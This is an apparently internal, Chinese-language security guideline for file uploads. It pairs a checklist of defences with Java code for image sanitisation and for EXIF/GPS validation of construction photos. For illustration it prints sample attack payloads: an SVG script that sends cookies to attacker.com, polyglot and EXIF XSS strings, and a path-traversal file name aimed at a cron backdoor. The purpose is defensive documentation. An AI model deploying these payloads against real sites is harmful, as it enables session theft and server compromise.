# KB-001: 檔案上傳安全規範

> **日期**：2026-04-24  
> **類型**：知識庫（安全規範）  
> **關聯 FN**：FN-00-020 檔案上傳、FN-00-021 檔案下載、FN-00-022 檔案預覽  
> **OWASP 參考**：A03:2021 Injection、A04:2021 Insecure Design

---

## 攻擊面總覽

| # | 攻擊類型 | 風險等級 | 攻擊方式 | 後果 |
|---|---------|---------|---------|------|
| 1 | **Stored XSS（SVG/HTML）** | 高 | 上傳含 `<script>` 的 SVG/HTML，管理員預覽時觸發 | 竊取 JWT/Cookie，冒充管理員 |
| 2 | **Polyglot File** | 高 | 檔案同時滿足 JPEG 和 HTML 格式，MIME sniffing 觸發 | 同上 |
| 3 | **Web Shell** | 嚴重 | 上傳 `.jsp`/`.php` 到 Web 可存取路徑 | 伺服器 RCE（遠端指令執行） |
| 4 | **Path Traversal** | 嚴重 | 檔名含 `../../../etc/cron.d/backdoor` | 覆蓋系統檔案 |
| 5 | **EXIF/Metadata 注入** | 中 | JPEG EXIF Comment 含 `<script>` | 若回顯 metadata 則觸發 XSS |
| 6 | **惡意巨集（Office）** | 中 | `.xlsx`/`.docx` 嵌入 VBA 巨集 | 管理員開啟後執行惡意程式 |
| 7 | **ZIP Bomb** | 低 | 42KB zip 解壓成 4.5PB | DoS（磁碟/記憶體耗盡） |
| 8 | **ImageTragick** | 高 | 惡意 SVG/MVG 觸發 ImageMagick RCE | 伺服器 RCE |

---

## 圖片夾帶 JS 的具體手法

### 1. SVG — 本質是 XML，可直接嵌入 JS

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="40" fill="red"/>
  <script>document.location='https://attacker.com/?c='+document.cookie</script>
</svg>
```

瀏覽器以 `image/svg+xml` 渲染時會執行 JS。

### 2. Polyglot File — 同時是合法圖片又是合法 HTML

```
FF D8 FF E0  ← JPEG magic bytes（圖片檢視器認為是 JPEG）
...JPEG 資料...
<html><script>alert('XSS')</script></html>  ← 附在 JPEG 尾巴
```

- 圖片檢視器 → 正常顯示
- 瀏覽器 MIME sniffing → 當 HTML 執行

### 3. EXIF Metadata 注入

```
EXIF Comment: <img src=x onerror=alert('XSS')>
```

如果系統把 EXIF 資料原樣顯示在網頁上，就觸發 XSS。

### 4. PNG tEXt chunk

PNG 允許自定義文字區塊，可以塞入 `<script>...</script>`，圖片渲染器忽略但若回顯到 HTML 則中招。

---

## 防禦檢查清單

### 必做（P0）

| # | 防禦措施 | 防什麼 | 實作方式 |
|---|---------|--------|---------|
| 1 | **副檔名白名單** | Web Shell / 危險格式 | 只允許 `jpg, png, gif, pdf, xlsx, docx, csv`，**禁止 SVG** |
| 2 | **Magic bytes 驗證** | 偽裝副檔名 | Apache Tika `detect()` 驗證真實 MIME type |
| 3 | **檔名重新產生** | Path Traversal / Web Shell | `UUID.randomUUID() + ".jpg"`，不用原始檔名 |
| 4 | **上傳目錄隔離** | Web Shell 直接存取 | 存到 Web root 外（`uploads/` 已符合 ✅） |
| 5 | **下載強制 attachment** | Stored XSS | `Content-Disposition: attachment; filename="原始檔名.jpg"` |
| 6 | **X-Content-Type-Options** | MIME sniffing / Polyglot | `X-Content-Type-Options: nosniff` |
| 7 | **檔案大小限制** | DoS | `spring.servlet.multipart.max-file-size=10MB` |

### 建議做（P1）

| # | 防禦措施 | 防什麼 | 實作方式 |
|---|---------|--------|---------|
| 8 | **圖片重新編碼** | EXIF 注入 / Polyglot / 所有嵌入內容 | `ImageIO.read()` → `ImageIO.write()` 只保留像素 |
| 9 | **預覽頁 CSP** | 萬一漏掉的 XSS | `Content-Security-Policy: script-src 'none'` |
| 10 | **不回顯 EXIF** | Metadata XSS | 不把 metadata 欄位放到 HTML |
| 11 | **病毒掃描** | 惡意軟體 | ClamAV（FN-00-020 已規劃） |

### 進階（P2）

| # | 防禦措施 | 防什麼 | 實作方式 |
|---|---------|--------|---------|
| 12 | **PDF 消毒** | PDF 嵌入 JS action | Apache PDFBox 重新產生 PDF |
| 13 | **預覽用獨立域名** | XSS 跨域隔離 | `preview.your-domain.com`（不同 origin） |
| 14 | **Office 巨集警告** | VBA 巨集 | 前端提示「此檔案可能含巨集」 |

---

## 圖片重新編碼（安全消毒 + 壓縮）

### 原理

```
用戶上傳 JPEG (5MB, 含 EXIF/Polyglot/惡意 payload)
        ↓
   ImageIO.read()  →  BufferedImage（純像素矩陣，所有非像素資料丟棄）
        ↓
   resize + quality control
        ↓
   ImageIO.write()  →  乾淨 JPEG (~300KB)
```

`ImageIO.read()` 只解碼像素，重新寫出時所有非像素資料都消失：
- EXIF metadata → 丟棄
- Polyglot 尾巴的 HTML/JS → 丟棄
- PNG tEXt chunk 注入 → 丟棄
- 非合法圖片 → `read()` 回傳 null → 直接拒絕

### 參考實作（JDK 內建，無外部依賴）

```java
public byte[] sanitizeAndCompress(InputStream input,
                                   String format,    // "jpg" | "png"
                                   int maxWidth,     // e.g. 1920
                                   float quality)    // 0.0~1.0, e.g. 0.75
    throws IOException {

    BufferedImage original = ImageIO.read(input);
    if (original == null) {
        throw new BusinessException(ErrorCode.INVALID_FILE_FORMAT);
    }

    // 1) 等比縮放（只縮不放大）
    BufferedImage result = original;
    if (original.getWidth() > maxWidth) {
        double ratio = (double) maxWidth / original.getWidth();
        int newH = (int) (original.getHeight() * ratio);
        result = new BufferedImage(maxWidth, newH, BufferedImage.TYPE_INT_RGB);
        Graphics2D g = result.createGraphics();
        g.setRenderingHint(RenderingHints.KEY_INTERPOLATION,
                           RenderingHints.VALUE_INTERPOLATION_BILINEAR);
        g.drawImage(original, 0, 0, maxWidth, newH, null);
        g.dispose();
    }

    // 2) JPEG 壓縮品質控制
    ByteArrayOutputStream out = new ByteArrayOutputStream();
    if ("jpg".equals(format)) {
        ImageWriter writer = ImageIO.getImageWritersByFormatName("jpg").next();
        ImageWriteParam param = writer.getDefaultWriteParam();
        param.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
        param.setCompressionQuality(quality);
        writer.setOutput(ImageIO.createImageOutputStream(out));
        writer.write(null, new IIOImage(result, null, null), param);
        writer.dispose();
    } else {
        ImageIO.write(result, format, out);
    }
    return out.toByteArray();
}
```

### 壓縮效果對照

| 情境 | 原始大小 | 處理後 | 安全效果 |
|------|---------|--------|---------|
| 4000×3000 手機照片 | 5~8 MB | ~300KB (1920px, q=0.75) | EXIF 清除、Polyglot 消除 |
| 含 EXIF XSS 的 JPEG | 2 MB | ~150KB | EXIF 完全丟棄 |
| Polyglot (JPEG+HTML) | 1 MB | ~100KB | 尾部 HTML 消失 |
| 偽裝成 .jpg 的 HTML | 50 KB | ❌ 拒絕 | `ImageIO.read()` = null |
| SVG（XML+JS） | 5 KB | ❌ 拒絕 | ImageIO 不支援 SVG → null |

### 注意事項

| 項目 | 說明 |
|------|------|
| PNG 透明度 | 用 `TYPE_INT_ARGB` 保留 alpha 通道 |
| GIF 動圖 | `ImageIO.read()` 只取第一幀，動圖會變靜態 |
| CMYK JPEG | JDK ImageIO 不支援 CMYK，需加 TwelveMonkeys 插件 |
| 處理時間 | 10MP 照片約 100~300ms，可接受 |

### ⚠️ 先擷取 EXIF 再消毒

施工照片需要 GPS 座標驗證，處理順序必須是：

```
1. 副檔名白名單 + Magic bytes 檢查
2. ★ 擷取 EXIF（GPS、時間戳等） → 存到 DB metadata 欄位
3. ImageIO 重新編碼（消毒 + 壓縮） → 存到磁碟
4. UUID 重命名存檔
```

步驟 2 和 3 的順序不能反，否則重新編碼後 EXIF 就消失了。
詳見 [ADR-002](ADR-002-ai-image-recognition.md) 的完整上傳處理流程。

---

## EXIF 資訊擷取（施工照片 GPS 驗證）

> 完整的 AI 影像辨識策略（地點分類、重複偵測、相似搜尋）見 [ADR-002](ADR-002-ai-image-recognition.md)。
> 本節僅記錄 EXIF 擷取的**安全面**注意事項。

### EXIF 常用欄位

| EXIF Tag | 說明 | 範例值 | 用途 |
|----------|------|--------|------|
| **GPSLatitude** + **GPSLatitudeRef** | 緯度 | 25° 2' 30.12" N | 施工地點驗證 |
| **GPSLongitude** + **GPSLongitudeRef** | 經度 | 121° 31' 45.67" E | 施工地點驗證 |
| **GPSAltitude** | 海拔 | 15.3m | 輔助資訊 |
| **DateTimeOriginal** | 拍攝時間 | 2026:04:24 14:30:22 | 施工時間驗證 |
| **Make** / **Model** | 相機/手機型號 | Apple / iPhone 15 Pro | 確認現場拍攝 |
| **ImageWidth** / **ImageLength** | 原始解析度 | 4032 × 3024 | 品質判斷 |
| **Orientation** | 旋轉方向 | 6 (rotate 90° CW) | 正確顯示 |
| **GPSImgDirection** | 拍攝朝向 | 127.5° (SE) | 輔助驗證 |

### Java 擷取方式：metadata-extractor

**Maven 依賴**（輕量，僅 ~200KB，無 transitive）：
```xml
<dependency>
    <groupId>com.drewnoakes</groupId>
    <artifactId>metadata-extractor</artifactId>
    <version>2.19.0</version>
</dependency>
```

**擷取範例**：
```java
import com.drew.imaging.ImageMetadataReader;
import com.drew.metadata.*;
import com.drew.metadata.exif.*;

public PhotoMetadata extractMetadata(InputStream input) throws Exception {
    Metadata metadata = ImageMetadataReader.readMetadata(input);

    // GPS
    GpsDirectory gps = metadata.getFirstDirectoryOfType(GpsDirectory.class);
    GeoLocation geo = (gps != null) ? gps.getGeoLocation() : null;

    // 拍攝時間
    ExifSubIFDDirectory exifSub = metadata.getFirstDirectoryOfType(ExifSubIFDDirectory.class);
    Date dateTime = (exifSub != null)
        ? exifSub.getDate(ExifSubIFDDirectory.TAG_DATETIME_ORIGINAL)
        : null;

    // 設備
    ExifIFD0Directory exifIFD0 = metadata.getFirstDirectoryOfType(ExifIFD0Directory.class);
    String make  = (exifIFD0 != null) ? exifIFD0.getString(ExifIFD0Directory.TAG_MAKE) : null;
    String model = (exifIFD0 != null) ? exifIFD0.getString(ExifIFD0Directory.TAG_MODEL) : null;

    return PhotoMetadata.builder()
        .latitude(geo != null ? geo.getLatitude() : null)    // 25.04170
        .longitude(geo != null ? geo.getLongitude() : null)   // 121.52935
        .takenAt(dateTime != null ? dateTime.toInstant() : null)
        .deviceMake(make)     // "Apple"
        .deviceModel(model)   // "iPhone 15 Pro"
        .build();
}
```

### GPS 距離驗證：Haversine 公式

```java
/**
 * 計算兩個 GPS 座標之間的距離（公尺）
 */
public static double haversineMeters(double lat1, double lon1,
                                      double lat2, double lon2) {
    final double R = 6_371_000; // 地球半徑（公尺）
    double dLat = Math.toRadians(lat2 - lat1);
    double dLon = Math.toRadians(lon2 - lon1);
    double a = Math.sin(dLat / 2) * Math.sin(dLat / 2)
             + Math.cos(Math.toRadians(lat1)) * Math.cos(Math.toRadians(lat2))
             * Math.sin(dLon / 2) * Math.sin(dLon / 2);
    return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
}
```

**驗證邏輯**：
```java
double distance = haversineMeters(
    photo.getLatitude(), photo.getLongitude(),   // 照片 GPS
    workOrder.getLat(), workOrder.getLng()        // 工單預期座標
);

if (distance > 200) {  // 容差 200 公尺
    // 標記警告：施工照片位置與工單不符
    photo.setLocationWarning(true);
    photo.setDistanceFromTarget(distance);
}
```

### 完整上傳處理流程（含 EXIF 擷取）

```
APP 拍照上傳
    ↓
1. 副檔名白名單 (jpg/png)
2. 檔案大小限制 (≤ 10MB)
3. Magic bytes 驗證 (Tika)
    ↓
4. ★ 擷取 EXIF metadata（用原始檔案，尚未消毒）
   → GPS 座標、拍攝時間、設備型號
   → 存入 DB: photo_metadata 表
    ↓
5. GPS 距離驗證（與工單座標比對）
   → distance > 200m → 標記 locationWarning
    ↓
6. ImageIO 重新編碼（消毒 + 壓縮）
   → EXIF 全部丟棄，只留乾淨像素
    ↓
7. UUID 重命名 + 存檔
8. 回傳 fileId + metadata（含 GPS + 距離 + 警告）
```

### EXIF 擷取的安全注意事項

| 風險 | 防禦 |
|------|------|
| EXIF 欄位含 XSS payload | 擷取後**不直接回顯 HTML**，前端用 `textContent` 或 Vue `{{ }}` 自動跳脫 |
| GPS 可以被偽造（修改 EXIF 工具） | GPS 驗證只做「輔助判斷 + 警告」，不做硬性攔截；搭配 APP 端即時定位做 cross-check |
| 照片無 EXIF（截圖/傳送過的照片） | 允許上傳，但標記 `noExifWarning=true`，提示「無法驗證拍攝位置」 |
| 時間可被竄改 | 與 APP 上傳時的 server timestamp 交叉比對 |

### 反偽造策略（多重交叉驗證）

| 驗證層 | 資料來源 | 說明 |
|--------|---------|------|
| **EXIF GPS** | 照片內嵌 | 可被篡改，但篡改門檻較高 |
| **APP 定位** | APP 上傳時附帶 `{ lat, lng }` | 即時 GPS，獨立於照片 |
| **上傳時間** | Server timestamp | 不可偽造 |
| **EXIF 拍攝時間** | 照片內嵌 | 與 server time 比對差異 |
| **三方交叉** | EXIF GPS vs APP GPS vs 工單座標 | 三者一致才無警告 |

> **設計原則**：GPS 驗證用於「輔助稽核 + 產生警告」，不用於「硬性阻止上傳」。
> 因為合法場景也可能 GPS 不準（室內/地下室/訊號遮蔽），硬擋會影響施工人員作業。

---

## 本系統現況

| 項目 | 狀態 |
|------|------|
| 上傳目錄在 Web root 外 | ✅ `project/backend/uploads/` |
| 副檔名白名單 | ⬜ FN-00-020 待實作 |
| Magic bytes 驗證 | ⬜ 待加 Apache Tika |
| 檔名 UUID 重新產生 | ⬜ 待確認 |
| Content-Disposition: attachment | ⬜ FN-00-021 待實作 |
| X-Content-Type-Options: nosniff | ⬜ 待加到 SecurityConfig |
| ClamAV 病毒掃描 | ⬜ FN-00-020 已規劃 |
| 圖片重新編碼 | ⬜ 待評估 |

---

## 關鍵原則

> **永遠不信任用戶上傳的檔案內容，即使副檔名和 magic bytes 都正確。**

防禦是多層的，任何單一檢查都可能被繞過：
- 只檢查副檔名 → Polyglot 繞過
- 只檢查 magic bytes → 尾部注入繞過
- 只靠 Content-Type → MIME sniffing 繞過
- 多層防禦組合才安全
